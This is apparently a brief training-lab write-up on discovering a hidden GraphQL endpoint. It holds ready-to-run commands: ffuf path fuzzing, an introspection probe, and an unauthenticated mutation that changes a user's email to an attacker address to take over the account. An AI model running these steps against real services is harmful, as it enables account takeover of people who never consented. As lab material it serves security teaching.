# Lab 3 — Finding a Hidden GraphQL Endpoint (PRACTITIONER)

## Vulnerability
Security through obscurity — non-standard GraphQL path with introspection
enabled and unauthenticated mutations.

## Quick Exploit
```bash
# 1. Fuzz paths
ffuf -u https://target/FUZZ -w graphql-wordlist.txt

# 2. Confirm endpoint
curl "https://target/api/internal/graphql-dev?query={__typename}"

# 3. Exploit unauthenticated mutation
curl -X POST https://target/api/internal/graphql-dev \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{changeEmail(id:1,email:\"attacker@evil.com\"){email}}"}'
```
